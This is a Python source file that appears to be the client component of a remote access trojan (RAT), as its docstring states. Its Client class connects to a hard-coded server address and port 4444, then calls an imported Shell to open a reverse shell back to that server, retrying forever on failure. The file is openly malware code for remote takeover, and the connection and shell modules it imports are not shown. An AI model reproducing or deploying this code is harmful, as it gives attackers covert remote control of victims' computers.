from client.connection import Connection
from client.rev_shell import Shell
import time
import socket

class Client:
    '''
    Performs all necesary actions for the RAT to function:
        - Creates socket
        - Gets a reverse shell back to the server
    '''
    
    def __init__(self, host: str, port: int) -> None:
        '''
        Constructor
        
        :param host: The server's IP
        :param port: The server's port number
        '''
        self.host = host
        self.port = port

    def hack(self):
        '''
        Creates a connection between server and client.
        Gets a reverse shell from client to server
        '''
        
        # Create client instance
        self.client = Connection(self.host, self.port)
        # Open socket connection back to server
        self.sock = self.client.connect()
        
        # Create shell instance
        self.shell = Shell(self.sock)
        # Get a reverse shell back to server
        try:
            self.shell.get_shell(self.sock)
        except:
            time.sleep(5) # Wait 5s
            self.sock.close() # Close erroneous connection
            self.hack() # Retry
            
         # Close connection when finished
        self.sock.close()
            
    
if __name__ == "__main__":
    # Run RAT with specified IP and port
    Client("10.15.0.2", 4444).hack()